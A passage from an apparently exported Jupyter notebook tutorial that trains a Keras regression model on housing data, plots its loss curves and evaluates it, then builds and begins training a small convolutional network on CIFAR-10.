- mae: 3.4121 - val_loss: 29.1006 - val_mae: 3.9623\nEpoch 61/200\n13/13 [==============================] - 0s 9ms/step - loss: 22.4740 - mae: 3.4556 - val_loss: 28.5392 - val_mae: 3.8531\nEpoch 62/200\n13/13 [==============================] - 0s 11ms/step - loss: 22.5698 - mae: 3.5308 - val_loss: 32.2885 - val_mae: 4.0641\nEpoch 63/200\n13/13 [==============================] - 0s 10ms/step - loss: 21.4554 - mae: 3.3937 - val_loss: 30.3071 - val_mae: 4.1957\nEpoch 64/200\n13/13 [==============================] - 0s 10ms/step - loss: 21.8027 - mae: 3.4242 - val_loss: 27.1902 - val_mae: 3.8086\nEpoch 65/200\n13/13 [==============================] - 0s 10ms/step - loss: 24.7308 - mae: 3.6522 - val_loss: 39.3288 - val_mae: 4.9832\nEpoch 66/200\n13/13 [==============================] - 0s 12ms/step - loss: 22.9252 - mae: 3.5862 - val_loss: 32.6013 - val_mae: 4.0197\nEpoch 67/200\n13/13 [==============================] - 0s 9ms/step - loss: 22.9201 - mae: 3.5575 - val_loss: 32.5449 - val_mae: 3.9819\nEpoch 68/200\n13/13 [==============================] - 0s 9ms/step - loss: 26.7672 - mae: 3.7019 - val_loss: 41.9045 - val_mae: 4.8744\nEpoch 69/200\n13/13 [==============================] - 0s 10ms/step - loss: 21.1358 - mae: 3.3544 - val_loss: 30.2412 - val_mae: 4.2482\nEpoch 70/200\n13/13 [==============================] - 0s 12ms/step - loss: 18.4177 - mae: 3.1963 - val_loss: 32.0725 - val_mae: 3.9863\nEpoch 71/200\n13/13 [==============================] - 0s 9ms/step - loss: 19.6991 - mae: 3.3073 - val_loss: 28.9564 - val_mae: 4.0845\nEpoch 72/200\n13/13 [==============================] - 0s 9ms/step - loss: 18.8953 - mae: 3.2107 - val_loss: 28.8556 - val_mae: 3.8060\nEpoch 73/200\n13/13 [==============================] - 0s 8ms/step - loss: 19.9072 - mae: 3.2788 - val_loss: 29.5674 - val_mae: 3.7913\nEpoch 74/200\n13/13 [==============================] - 0s 13ms/step - loss: 16.7959 - mae: 3.0089 - val_loss: 29.3315 - val_mae: 3.8642\nEpoch 75/200\n13/13 [==============================] - 0s 11ms/step - loss: 16.5847 - mae: 3.0035 - val_loss: 29.0402 - val_mae: 3.7806\nEpoch 76/200\n13/13 [==============================] - 0s 12ms/step - loss: 18.7005 - mae: 3.1929 - val_loss: 29.0227 - val_mae: 3.8439\nEpoch 77/200\n13/13 [==============================] - 0s 14ms/step - loss: 16.6677 - mae: 2.9877 - val_loss: 37.2215 - val_mae: 4.4234\nEpoch 78/200\n13/13 [==============================] - 0s 12ms/step - loss: 17.5018 - mae: 3.0431 - val_loss: 31.3399 - val_mae: 4.2431\nEpoch 79/200\n13/13 [==============================] - 0s 10ms/step - loss: 19.6106 - mae: 3.2082 - val_loss: 32.4476 - val_mae: 4.2819\nEpoch 80/200\n13/13 [==============================] - 0s 11ms/step - loss: 36.2121 - mae: 4.7760 - val_loss: 28.4692 - val_mae: 3.9099\nEpoch 81/200\n13/13 [==============================] - 0s 12ms/step - loss: 40.8866 - mae: 4.8306 - val_loss: 35.2170 - val_mae: 4.3141\nEpoch 82/200\n13/13 [==============================] - 0s 11ms/step - loss: 25.5971 - mae: 3.7871 - val_loss: 31.8203 - val_mae: 3.9623\nEpoch 83/200\n13/13 [==============================] - 0s 12ms/step - loss: 20.3588 - mae: 3.3205 - val_loss: 30.0706 - val_mae: 3.9036\nEpoch 84/200\n13/13 [==============================] - 0s 6ms/step - loss: 25.3911 - mae: 3.8649 - val_loss: 33.7465 - val_mae: 4.5236\nEpoch 85/200\n13/13 [==============================] - 0s 6ms/step - loss: 19.7263 - mae: 3.2715 - val_loss: 32.0944 - val_mae: 3.9505\nEpoch 86/200\n13/13 [==============================] - 0s 7ms/step - loss: 16.5362 - mae: 3.0233 - val_loss: 29.3023 - val_mae: 3.9333\nEpoch 87/200\n13/13 [==============================] - 0s 20ms/step - loss: 17.9351 - mae: 3.1035 - val_loss: 34.1284 - val_mae: 4.0650\nEpoch 88/200\n13/13 [==============================] - 0s 11ms/step - loss: 16.2137 - mae: 2.9476 - val_loss: 27.3214 - val_mae: 3.7984\nEpoch 89/200\n13/13 [==============================] - 0s 6ms/step - loss: 18.8782 - mae: 3.1469 - val_loss: 35.5682 - val_mae: 4.2400\nEpoch 90/200\n13/13 [==============================] - 0s 14ms/step - loss: 17.1858 - mae: 3.0329 - val_loss: 31.3671 - val_mae: 3.9237\nEpoch 91/200\n13/13 [==============================] - 0s 17ms/step - loss: 15.3767 - mae: 2.9254 - val_loss: 30.9757 - val_mae: 4.0625\nEpoch 92/200\n13/13 [==============================] - 0s 10ms/step - loss: 14.6350 - mae: 2.8037 - val_loss: 33.2747 - val_mae: 3.9690\nEpoch 93/200\n13/13 [==============================] - 0s 11ms/step - loss: 18.9898 - mae: 3.1626 - val_loss: 34.8545 - val_mae: 4.2942\nEpoch 94/200\n13/13 [==============================] - 0s 15ms/step - loss: 17.2571 - mae: 3.0950 - val_loss: 37.2295 - val_mae: 4.2279\nEpoch 95/200\n13/13 [==============================] - 0s 24ms/step - loss: 17.2022 - mae: 3.0691 - val_loss: 33.6021 - val_mae: 4.0912\nEpoch 96/200\n13/13 [==============================] - 0s 22ms/step - loss: 14.8782 - mae: 2.8536 - val_loss: 28.8832 - val_mae: 3.9681\nEpoch 97/200\n13/13 [==============================] - 0s 17ms/step - loss: 16.0852 - mae: 2.9510 - val_loss: 35.1912 - val_mae: 4.0916\nEpoch 98/200\n13/13 [==============================] - 0s 15ms/step - loss: 15.8149 - mae: 2.8870 - val_loss: 30.4375 - val_mae: 4.0452\nEpoch 99/200\n13/13 [==============================] - 0s 24ms/step - loss: 15.2301 - mae: 2.8610 - val_loss: 30.6453 - val_mae: 3.7918\nEpoch 100/200\n13/13 [==============================] - 0s 26ms/step - loss: 15.6172 - mae: 2.8977 - val_loss: 38.3264 - val_mae: 4.5286\nEpoch 101/200\n13/13 [==============================] - 0s 16ms/step - loss: 16.5772 - mae: 3.0132 - val_loss: 32.3224 - val_mae: 4.0342\nEpoch 102/200\n13/13 [==============================] - 0s 23ms/step - loss: 16.5946 - mae: 3.0472 - val_loss: 29.5199 - val_mae: 3.8470\nEpoch 103/200\n13/13 [==============================] - 0s 26ms/step - loss: 14.4194 - mae: 2.7852 - val_loss: 32.6959 - val_mae: 3.9352\nEpoch 104/200\n13/13 [==============================] - 0s 10ms/step - loss: 13.8321 - mae: 2.7185 - val_loss: 32.7366 - val_mae: 3.9338\nEpoch 105/200\n13/13 [==============================] - 0s 9ms/step - loss: 14.4389 - mae: 2.7212 - val_loss: 32.4684 - val_mae: 4.1554\nEpoch 106/200\n13/13 [==============================] - 0s 10ms/step - loss: 14.4000 - mae: 2.7979 - val_loss: 37.3536 - val_mae: 4.4501\nEpoch 107/200\n13/13 [==============================] - 0s 14ms/step - loss: 17.8691 - mae: 3.1741 - val_loss: 29.1527 - val_mae: 3.7640\nEpoch 108/200\n13/13 [==============================] - 0s 9ms/step - loss: 16.2034 - mae: 3.0437 - val_loss: 32.7455 - val_mae: 3.9841\nEpoch 109/200\n13/13 [==============================] - 0s 10ms/step - loss: 15.4557 - mae: 3.0047 - val_loss: 31.6899 - val_mae: 3.9538\nEpoch 110/200\n13/13 [==============================] - 0s 12ms/step - loss: 13.9040 - mae: 2.7296 - val_loss: 32.0091 - val_mae: 4.2775\nEpoch 111/200\n13/13 [==============================] - 0s 10ms/step - loss: 15.7991 - mae: 2.9598 - val_loss: 35.2154 - val_mae: 4.2501\nEpoch 112/200\n13/13 [==============================] - 0s 13ms/step - loss: 14.4490 - mae: 2.8153 - val_loss: 29.9829 - val_mae: 3.8391\nEpoch 113/200\n13/13 [==============================] - 0s 10ms/step - loss: 13.2926 - mae: 2.7048 - val_loss: 31.8703 - val_mae: 3.8924\nEpoch 114/200\n13/13 [==============================] - 0s 11ms/step - loss: 13.3824 - mae: 2.6615 - val_loss: 41.0271 - val_mae: 4.8232\nEpoch 115/200\n13/13 [==============================] - 0s 13ms/step - loss: 17.4602 - mae: 3.0191 - val_loss: 30.4805 - val_mae: 3.7799\nEpoch 116/200\n13/13 [==============================] - 0s 15ms/step - loss: 21.0600 - mae: 3.4008 - val_loss: 32.8811 - val_mae: 4.0718\nEpoch 117/200\n13/13 [==============================] - 0s 12ms/step - loss: 20.6031 - mae: 3.3344 - val_loss: 29.2403 - val_mae: 4.1208\nEpoch 118/200\n13/13 [==============================] - 0s 16ms/step - loss: 16.8213 - mae: 3.0334 - val_loss: 31.8631 - val_mae: 3.9916\nEpoch 119/200\n13/13 [==============================] - 0s 14ms/step - loss: 15.0947 - mae: 2.8785 - val_loss: 35.9509 - val_mae: 4.4248\nEpoch 120/200\n13/13 [==============================] - 0s 10ms/step - loss: 16.5802 - mae: 3.0263 - val_loss: 34.4360 - val_mae: 4.0188\nEpoch 121/200\n13/13 [==============================] - 0s 12ms/step - loss: 17.7656 - mae: 3.0269 - val_loss: 42.7722 - val_mae: 5.0620\nEpoch 122/200\n13/13 [==============================] - 0s 13ms/step - loss: 17.3118 - mae: 3.0337 - val_loss: 32.5483 - val_mae: 3.9267\nEpoch 123/200\n13/13 [==============================] - 0s 10ms/step - loss: 13.7797 - mae: 2.7566 - val_loss: 32.5470 - val_mae: 4.0013\nEpoch 124/200\n13/13 [==============================] - 0s 11ms/step - loss: 20.4752 - mae: 3.3211 - val_loss: 35.2720 - val_mae: 4.0995\nEpoch 125/200\n13/13 [==============================] - 0s 12ms/step - loss: 16.4471 - mae: 2.9872 - val_loss: 36.7188 - val_mae: 4.1868\nEpoch 126/200\n13/13 [==============================] - 0s 15ms/step - loss: 15.9363 - mae: 2.9171 - val_loss: 44.0103 - val_mae: 4.5155\nEpoch 127/200\n13/13 [==============================] - 0s 11ms/step - loss: 15.3808 - mae: 2.8384 - val_loss: 31.5518 - val_mae: 3.8308\nEpoch 128/200\n13/13 [==============================] - 0s 15ms/step - loss: 14.5555 - mae: 2.8034 - val_loss: 38.3403 - val_mae: 4.6483\nEpoch 129/200\n13/13 [==============================] - 0s 10ms/step - loss: 15.5323 - mae: 3.0320 - val_loss: 33.0989 - val_mae: 3.9910\nEpoch 130/200\n13/13 [==============================] - 0s 12ms/step - loss: 17.3143 - mae: 3.0361 - val_loss: 33.5947 - val_mae: 4.0584\nEpoch 131/200\n13/13 [==============================] - 0s 18ms/step - loss: 14.3783 - mae: 2.7693 - val_loss: 39.4443 - val_mae: 4.2810\nEpoch 132/200\n13/13 [==============================] - 0s 16ms/step - loss: 17.3261 - mae: 3.0688 - val_loss: 30.0193 - val_mae: 3.7745\nEpoch 133/200\n13/13 [==============================] - 0s 12ms/step - loss: 15.3965 - mae: 2.8311 - val_loss: 32.8228 - val_mae: 4.2744\nEpoch 134/200\n13/13 [==============================] - 0s 11ms/step - loss: 15.8023 - mae: 2.8975 - val_loss: 34.4812 - val_mae: 4.0377\nEpoch 135/200\n13/13 [==============================] - 0s 11ms/step - loss: 16.3663 - mae: 2.9170 - val_loss: 34.0779 - val_mae: 4.2226\nEpoch 136/200\n13/13 [==============================] - 0s 10ms/step - loss: 13.5982 - mae: 2.7267 - val_loss: 35.1694 - val_mae: 4.2569\nEpoch 137/200\n13/13 [==============================] - 0s 15ms/step - loss: 17.2159 - mae: 2.9728 - val_loss: 30.5006 - val_mae: 3.9121\nEpoch 138/200\n13/13 [==============================] - 0s 13ms/step - loss: 13.9763 - mae: 2.7302 - val_loss: 31.9929 - val_mae: 3.9713\nEpoch 139/200\n13/13 [==============================] - 0s 15ms/step - loss: 13.7487 - mae: 2.6992 - val_loss: 31.3816 - val_mae: 3.8321\nEpoch 140/200\n13/13 [==============================] - 0s 10ms/step - loss: 13.7296 - mae: 2.6848 - val_loss: 35.0499 - val_mae: 4.3181\nEpoch 141/200\n13/13 [==============================] - 0s 11ms/step - loss: 13.9495 - mae: 2.7698 - val_loss: 31.8743 - val_mae: 3.9288\nEpoch 142/200\n13/13 [==============================] - 0s 13ms/step - loss: 12.6621 - mae: 2.6362 - val_loss: 33.0965 - val_mae: 3.9352\nEpoch 143/200\n13/13 [==============================] - 0s 11ms/step - loss: 15.9332 - mae: 2.9238 - val_loss: 31.0388 - val_mae: 4.2493\nEpoch 144/200\n13/13 [==============================] - 0s 25ms/step - loss: 17.0841 - mae: 3.0638 - val_loss: 32.0788 - val_mae: 4.0152\nEpoch 145/200\n13/13 [==============================] - 0s 14ms/step - loss: 12.8091 - mae: 2.7026 - val_loss: 34.9562 - val_mae: 4.1135\nEpoch 146/200\n13/13 [==============================] - 0s 14ms/step - loss: 13.6347 - mae: 2.7887 - val_loss: 32.1059 - val_mae: 3.9237\nEpoch 147/200\n13/13 [==============================] - 0s 18ms/step - loss: 14.1129 - mae: 2.7363 - val_loss: 35.5106 - val_mae: 4.1788\nEpoch 148/200\n13/13 [==============================] - 0s 14ms/step - loss: 14.8108 - mae: 2.7969 - val_loss: 33.9997 - val_mae: 4.1948\nEpoch 149/200\n13/13 [==============================] - 0s 15ms/step - loss: 12.7958 - mae: 2.7145 - val_loss: 31.5091 - val_mae: 4.0978\nEpoch 150/200\n13/13 [==============================] - 0s 11ms/step - loss: 12.2240 - mae: 2.6315 - val_loss: 41.7839 - val_mae: 4.8633\nEpoch 151/200\n13/13 [==============================] - 0s 14ms/step - loss: 15.2069 - mae: 2.8599 - val_loss: 34.5472 - val_mae: 4.0323\nEpoch 152/200\n13/13 [==============================] - 0s 14ms/step - loss: 16.9133 - mae: 2.9558 - val_loss: 29.3688 - val_mae: 4.2467\nEpoch 153/200\n13/13 [==============================] - 0s 11ms/step - loss: 15.1710 - mae: 2.8159 - val_loss: 33.1368 - val_mae: 4.0092\nEpoch 154/200\n13/13 [==============================] - 0s 8ms/step - loss: 14.3021 - mae: 2.7724 - val_loss: 33.4760 - val_mae: 4.1566\nEpoch 155/200\n13/13 [==============================] - 0s 9ms/step - loss: 17.3418 - mae: 3.1447 - val_loss: 28.3930 - val_mae: 3.7028\nEpoch 156/200\n13/13 [==============================] - 0s 10ms/step - loss: 13.6271 - mae: 2.7637 - val_loss: 32.2386 - val_mae: 4.0141\nEpoch 157/200\n13/13 [==============================] - 0s 10ms/step - loss: 12.9707 - mae: 2.6545 - val_loss: 30.4212 - val_mae: 3.7932\nEpoch 158/200\n13/13 [==============================] - 0s 9ms/step - loss: 12.6811 - mae: 2.6814 - val_loss: 31.3527 - val_mae: 3.9395\nEpoch 159/200\n13/13 [==============================] - 0s 10ms/step - loss: 12.1345 - mae: 2.5292 - val_loss: 31.3304 - val_mae: 3.8144\nEpoch 160/200\n13/13 [==============================] - 0s 10ms/step - loss: 13.3987 - mae: 2.6795 - val_loss: 37.0845 - val_mae: 4.2673\nEpoch 161/200\n13/13 [==============================] - 0s 11ms/step - loss: 14.3757 - mae: 2.8472 - val_loss: 33.8015 - val_mae: 4.2567\nEpoch 162/200\n13/13 [==============================] - 0s 14ms/step - loss: 15.8548 - mae: 2.9494 - val_loss: 40.5819 - val_mae: 4.5811\nEpoch 163/200\n13/13 [==============================] - 0s 10ms/step - loss: 16.9006 - mae: 2.9989 - val_loss: 30.7470 - val_mae: 3.8467\nEpoch 164/200\n13/13 [==============================] - 0s 14ms/step - loss: 12.3910 - mae: 2.6357 - val_loss: 30.2299 - val_mae: 3.7768\nEpoch 165/200\n13/13 [==============================] - 0s 21ms/step - loss: 12.0933 - mae: 2.5328 - val_loss: 30.3041 - val_mae: 3.8112\nEpoch 166/200\n13/13 [==============================] - 0s 20ms/step - loss: 12.4885 - mae: 2.6463 - val_loss: 31.1604 - val_mae: 3.8742\nEpoch 167/200\n13/13 [==============================] - 0s 19ms/step - loss: 12.6699 - mae: 2.5701 - val_loss: 34.6526 - val_mae: 4.0566\nEpoch 168/200\n13/13 [==============================] - 0s 18ms/step - loss: 12.9657 - mae: 2.6245 - val_loss: 28.6603 - val_mae: 3.7383\nEpoch 169/200\n13/13 [==============================] - 0s 18ms/step - loss: 12.4112 - mae: 2.5634 - val_loss: 30.3964 - val_mae: 3.8123\nEpoch 170/200\n13/13 [==============================] - 0s 17ms/step - loss: 11.6612 - mae: 2.5292 - val_loss: 32.4453 - val_mae: 3.7918\nEpoch 171/200\n13/13 [==============================] - 0s 17ms/step - loss: 13.1072 - mae: 2.6638 - val_loss: 32.1502 - val_mae: 4.0244\nEpoch 172/200\n13/13 [==============================] - 0s 23ms/step - loss: 13.1694 - mae: 2.7193 - val_loss: 35.4646 - val_mae: 4.0583\nEpoch 173/200\n13/13 [==============================] - 0s 18ms/step - loss: 17.1581 - mae: 3.0186 - val_loss: 31.8929 - val_mae: 3.9824\nEpoch 174/200\n13/13 [==============================] - 0s 10ms/step - loss: 12.2085 - mae: 2.6285 - val_loss: 31.8660 - val_mae: 3.9625\nEpoch 175/200\n13/13 [==============================] - 0s 8ms/step - loss: 12.0036 - mae: 2.5467 - val_loss: 31.5978 - val_mae: 3.8880\nEpoch 176/200\n13/13 [==============================] - 0s 6ms/step - loss: 13.1227 - mae: 2.6581 - val_loss: 31.2217 - val_mae: 3.7960\nEpoch 177/200\n13/13 [==============================] - 0s 6ms/step - loss: 12.8984 - mae: 2.6586 - val_loss: 28.2532 - val_mae: 3.6868\nEpoch 178/200\n13/13 [==============================] - 0s 6ms/step - loss: 14.6840 - mae: 2.8977 - val_loss: 36.5319 - val_mae: 4.3848\nEpoch 179/200\n13/13 [==============================] - 0s 6ms/step - loss: 14.6307 - mae: 2.8265 - val_loss: 38.5169 - val_mae: 4.4178\nEpoch 180/200\n13/13 [==============================] - 0s 6ms/step - loss: 16.5457 - mae: 2.8798 - val_loss: 31.0762 - val_mae: 4.2741\nEpoch 181/200\n13/13 [==============================] - 0s 6ms/step - loss: 16.6882 - mae: 3.0610 - val_loss: 29.4484 - val_mae: 3.9237\nEpoch 182/200\n13/13 [==============================] - 0s 6ms/step - loss: 14.6878 - mae: 2.7954 - val_loss: 31.3718 - val_mae: 3.8418\nEpoch 183/200\n13/13 [==============================] - 0s 6ms/step - loss: 12.9565 - mae: 2.6387 - val_loss: 35.0675 - val_mae: 4.1496\nEpoch 184/200\n13/13 [==============================] - 0s 6ms/step - loss: 11.8077 - mae: 2.5009 - val_loss: 31.5590 - val_mae: 3.8201\nEpoch 185/200\n13/13 [==============================] - 0s 6ms/step - loss: 13.9091 - mae: 2.7684 - val_loss: 29.9861 - val_mae: 3.8698\nEpoch 186/200\n13/13 [==============================] - 0s 6ms/step - loss: 14.9959 - mae: 2.7887 - val_loss: 33.8696 - val_mae: 4.0010\nEpoch 187/200\n13/13 [==============================] - 0s 7ms/step - loss: 12.6529 - mae: 2.6726 - val_loss: 35.0206 - val_mae: 4.2086\nEpoch 188/200\n13/13 [==============================] - 0s 6ms/step - loss: 15.5221 - mae: 2.8949 - val_loss: 29.4232 - val_mae: 4.1253\nEpoch 189/200\n13/13 [==============================] - 0s 6ms/step - loss: 18.6872 - mae: 3.1408 - val_loss: 44.2267 - val_mae: 4.6163\nEpoch 190/200\n13/13 [==============================] - 0s 7ms/step - loss: 19.8354 - mae: 3.2660 - val_loss: 29.9729 - val_mae: 3.9121\nEpoch 191/200\n13/13 [==============================] - 0s 6ms/step - loss: 11.5201 - mae: 2.5467 - val_loss: 35.5785 - val_mae: 4.0348\nEpoch 192/200\n13/13 [==============================] - 0s 7ms/step - loss: 12.0410 - mae: 2.5484 - val_loss: 28.0710 - val_mae: 3.7645\nEpoch 193/200\n13/13 [==============================] - 0s 6ms/step - loss: 10.7334 - mae: 2.4454 - val_loss: 31.1684 - val_mae: 3.8540\nEpoch 194/200\n13/13 [==============================] - 0s 6ms/step - loss: 11.7818 - mae: 2.5695 - val_loss: 30.4062 - val_mae: 3.9568\nEpoch 195/200\n13/13 [==============================] - 0s 6ms/step - loss: 12.3549 - mae: 2.5756 - val_loss: 31.9517 - val_mae: 3.9071\nEpoch 196/200\n13/13 [==============================] - 0s 7ms/step - loss: 12.5529 - mae: 2.6248 - val_loss: 29.7121 - val_mae: 3.7148\nEpoch 197/200\n13/13 [==============================] - 0s 6ms/step - loss: 12.6280 - mae: 2.6674 - val_loss: 31.2437 - val_mae: 4.0034\nEpoch 198/200\n13/13 [==============================] - 0s 6ms/step - loss: 11.1278 - mae: 2.4925 - val_loss: 32.3009 - val_mae: 3.8607\nEpoch 199/200\n13/13 [==============================] - 0s 6ms/step - loss: 12.6047 - mae: 2.6339 - val_loss: 29.1286 - val_mae: 3.7785\nEpoch 200/200\n13/13 [==============================] - 0s 6ms/step - loss: 11.6160 - mae: 2.5763 - val_loss: 33.1137 - val_mae: 3.8703\n</pre> In\u00a0[\u00a0]: Copied! <pre>history = history.history\n</pre> history = history.history In\u00a0[\u00a0]: Copied! <pre>print(history.keys())\n</pre> print(history.keys()) <pre>dict_keys(['loss', 'mae', 'val_loss', 'val_mae'])\n</pre> In\u00a0[\u00a0]: Copied! <pre>plt.plot(range(1, 201), history['loss'])\nplt.plot(range(1, 201), history['val_loss'])\n\nplt.title('MSE Loss While Training')\nplt.xlabel('Epoch Number')\nplt.ylabel('MSE Loss')\nplt.legend(['Training Loss', 'Testing Loss'])\nplt.show()\n</pre> plt.plot(range(1, 201), history['loss']) plt.plot(range(1, 201), history['val_loss'])  plt.title('MSE Loss While Training') plt.xlabel('Epoch Number') plt.ylabel('MSE Loss') plt.legend(['Training Loss', 'Testing Loss']) plt.show() In\u00a0[\u00a0]: Copied! <pre>plt.plot(range(1, 201), history['loss'])\nplt.plot(range(1, 201), history['val_loss'])\n\nplt.title('MSE Loss While Training')\nplt.xlabel('Epoch Number')\nplt.ylabel('MSE Loss')\nplt.legend(['Training Loss', 'Testing Loss'])\nplt.ylim(0, 100)\nplt.show()\n</pre> plt.plot(range(1, 201), history['loss']) plt.plot(range(1, 201), history['val_loss'])  plt.title('MSE Loss While Training') plt.xlabel('Epoch Number') plt.ylabel('MSE Loss') plt.legend(['Training Loss', 'Testing Loss']) plt.ylim(0, 100) plt.show() In\u00a0[\u00a0]: Copied! <pre># We can also evaluate our model after training\n\nhousing_model.evaluate(housing_train_x, housing_train_y)\n</pre> # We can also evaluate our model after training  housing_model.evaluate(housing_train_x, housing_train_y) <pre>13/13 [==============================] - 0s 3ms/step - loss: 10.2159 - mae: 2.3925\n</pre> Out[\u00a0]: <pre>[10.215892791748047, 2.3924641609191895]</pre> In\u00a0[\u00a0]: Copied! <pre>housing_model.evaluate(housing_test_x, housing_test_y)\n</pre> housing_model.evaluate(housing_test_x, housing_test_y) <pre>4/4 [==============================] - 0s 6ms/step - loss: 33.1137 - mae: 3.8703\n</pre> Out[\u00a0]: <pre>[33.11373519897461, 3.8702917098999023]</pre> In\u00a0[\u00a0]: Copied! <pre>cf_10_train_data, cf_10_test_data = tf.keras.datasets.cifar10.load_data()\n\n\ncf_10_train_x, cf_10_train_y = cf_10_train_data\n\ncf_10_test_x, cf_10_test_y = cf_10_test_data\n\n\ncf_10_train_y = tf.one_hot(cf_10_train_y.reshape((-1, )), 10)\ncf_10_test_y = tf.one_hot(cf_10_test_y.reshape((-1, )), 10)\n</pre> cf_10_train_data, cf_10_test_data = tf.keras.datasets.cifar10.load_data()   cf_10_train_x, cf_10_train_y = cf_10_train_data  cf_10_test_x, cf_10_test_y = cf_10_test_data   cf_10_train_y = tf.one_hot(cf_10_train_y.reshape((-1, )), 10) cf_10_test_y = tf.one_hot(cf_10_test_y.reshape((-1, )), 10) In\u00a0[\u00a0]: Copied! <pre>print(cf_10_train_x.shape, cf_10_train_y.shape)\nprint(cf_10_test_x.shape, cf_10_test_y.shape)\n</pre> print(cf_10_train_x.shape, cf_10_train_y.shape) print(cf_10_test_x.shape, cf_10_test_y.shape) <pre>(50000, 32, 32, 3) (50000, 10)\n(10000, 32, 32, 3) (10000, 10)\n</pre> In\u00a0[\u00a0]: Copied! <pre>cf_10_model = tf.keras.models.Sequential()\n\ncf_10_model.add(tf.keras.layers.Input(shape = (32, 32, 3))) # input shape for our images\n\n\n# Convolutional layer with 16 filters each of size (3, 3) and a relu activation function\ncf_10_model.add(tf.keras.layers.Conv2D(16, (3, 3), activation='relu'))\ncf_10_model.add(tf.keras.layers.MaxPooling2D())\n\n# Convolutional layer with 32 filters each of size (3, 3) and a relu activation function\n\ncf_10_model.add(tf.keras.layers.Conv2D(32, (3, 3), activation='relu'))\ncf_10_model.add(tf.keras.layers.MaxPooling2D())\n\n# Convert the data from 3 dimentions to 1 dimention\ncf_10_model.add(tf.keras.layers.Flatten())\n# Hidden Dense Layer\ncf_10_model.add(tf.keras.layers.Dense(64, activation = tf.nn.relu))\n\n# Output Layer \n# 10 outputs, one for each class as the model will output the probability of each individual class\ncf_10_model.add(tf.keras.layers.Dense(10, activation = tf.nn.softmax))\n\ncf_10_model.summary()\n</pre> cf_10_model = tf.keras.models.Sequential()  cf_10_model.add(tf.keras.layers.Input(shape = (32, 32, 3))) # input shape for our images   # Convolutional layer with 16 filters each of size (3, 3) and a relu activation function cf_10_model.add(tf.keras.layers.Conv2D(16, (3, 3), activation='relu')) cf_10_model.add(tf.keras.layers.MaxPooling2D())  # Convolutional layer with 32 filters each of size (3, 3) and a relu activation function  cf_10_model.add(tf.keras.layers.Conv2D(32, (3, 3), activation='relu')) cf_10_model.add(tf.keras.layers.MaxPooling2D())  # Convert the data from 3 dimentions to 1 dimention cf_10_model.add(tf.keras.layers.Flatten()) # Hidden Dense Layer cf_10_model.add(tf.keras.layers.Dense(64, activation = tf.nn.relu))  # Output Layer  # 10 outputs, one for each class as the model will output the probability of each individual class cf_10_model.add(tf.keras.layers.Dense(10, activation = tf.nn.softmax))  cf_10_model.summary() <pre>Model: \"sequential_1\"\n_________________________________________________________________\n Layer (type)                Output Shape              Param #   \n=================================================================\n conv2d (Conv2D)             (None, 30, 30, 16)        448       \n                                                                 \n max_pooling2d (MaxPooling2D  (None, 15, 15, 16)       0         \n )                                                               \n                                                                 \n conv2d_1 (Conv2D)           (None, 13, 13, 32)        4640      \n                                                                 \n max_pooling2d_1 (MaxPooling  (None, 6, 6, 32)         0         \n 2D)                                                             \n                                                                 \n flatten (Flatten)           (None, 1152)              0         \n                                                                 \n dense_4 (Dense)             (None, 64)                73792     \n                                                                 \n dense_5 (Dense)             (None, 10)                650       \n                                                                 \n=================================================================\nTotal params: 79,530\nTrainable params: 79,530\nNon-trainable params: 0\n_________________________________________________________________\n</pre> In\u00a0[\u00a0]: Copied! <pre>tf.keras.utils.plot_model(cf_10_model)\n</pre> tf.keras.utils.plot_model(cf_10_model) Out[\u00a0]: In\u00a0[\u00a0]: Copied! <pre>cf_10_model.compile(loss = 'categorical_crossentropy', optimizer = tf.keras.optimizers.Adam(0.001), metrics = ['Acc'])\n</pre> cf_10_model.compile(loss = 'categorical_crossentropy', optimizer = tf.keras.optimizers.Adam(0.001), metrics = ['Acc']) In\u00a0[\u00a0]: Copied! <pre>history = cf_10_model.fit(cf_10_train_x, cf_10_train_y, epochs = 20, batch_size = 1024,\n                validation_data = (cf_10_test_x, cf_10_test_y))\n</pre> history = cf_10_model.fit(cf_10_train_x, cf_10_train_y, epochs = 20, batch_size = 1024,                 validation_data = (cf_10_test_x, cf_10_test_y)) <pre>Epoch 1/20\n49/49 [==============================] - 4s 26ms/step - loss: 13.5017 - Acc: 0.1346 - val_loss: 2.6569 - val_Acc: 0.1639\nEpoch 2/20\n49/49 [==============================] - 1s 15ms/step - loss: 2.2346 - Acc: 0.2025 - val_loss: 2.0436 - val_Acc: 0.2622\nEpoch 3/20\n49/49 [==============================] - 1s 15ms/step - loss: 1.9384 - Acc: 0.3068 - val_loss: 1.8320 - val_Acc: 0.3497\nEpoch 4/20\n49/49 [==============================] - 1s 16ms/step - loss: 1.7267 - Acc: 0.3842 - val_loss: 1.7202 - val_Acc: 0.3964\nEpoch 5/20\n49/49 [==============================] - 1s 15ms/step - loss: 1.5805 - Acc: 0.4358 - val_loss: 1.5615 - val_Acc: 0.4397\nEpoch 6/20\n49/49 [==============================] - 1s 15ms/step - loss: 1.4846 - Acc: 0.4724 - val_loss: 1.4933 - val_Acc: 0.4700\nEpoch 7/20\n49/49 [==============================] - 1s 16ms/step - loss: 1.4071 - Acc: 0.5024 - val_loss: 1.4392 - val_Acc: 0.4926\nEpoch 8/20\n49/49 [==============================] - 1s 16ms/step - loss: 1.3645 - Acc: 0.5201 - val_loss: 1.4387 - val_Acc: 0.4934\nEpoch 9/20\n49/49 [==============================] - 1s 16ms/step - loss: 1.3254 - Acc: 0.5341 - val_loss: 1.3899 - val_Acc: 0.5163\nEpoch 10/20\n49/49 [==============================] - 1s 16ms/step - loss: 1.2808 - Acc: 0.5506 - val_loss: 1.3951 - val_Acc: 0.5074\nEpoch 11/20\n49/49 [==============================] - 1s 14ms/step - loss: 1.2438 - Acc: 0.5625 - val_loss: 1.3350 - val_Acc: 0.5327\nEpoch 12/20\n49/49 [==============================] - 1s 15ms/step - loss: 1.2046 - Acc: 0.5775 - val_loss: 1.3381 - val_Acc: 0.5369\nEpoch 13/20\n49/49 [==============================] - 1s 15ms/step - loss: 1.1844 - Acc: 0.5837 - val_loss: 1.3103 - val_Acc: 0.5491\nEpoch 14/20\n49/49 [==============================] - 1s 15ms/step - loss: 1.1450 - Acc: 0.5998 - val_loss: 1.3172 - val_Acc: 0.5510\nEpoch 15/20\n49/49 [==============================] - 1s 15ms/step - loss: 1.1243 - Acc: 0.6051 - val_loss: 1.2908 - val_Acc: 0.5581\nEpoch 16/20\n49/49 [==============================] - 1s 15ms/step - loss: 1.0974 - Acc: 0.6171 - val_loss: 1.2791 - val_Acc: 0.5667\nEpoch 17/20\n49/49 [==============================] - 1s 15ms/step - loss: 1.0740 - Acc: 0.6233 - val_loss: 1.2763 - val_Acc: 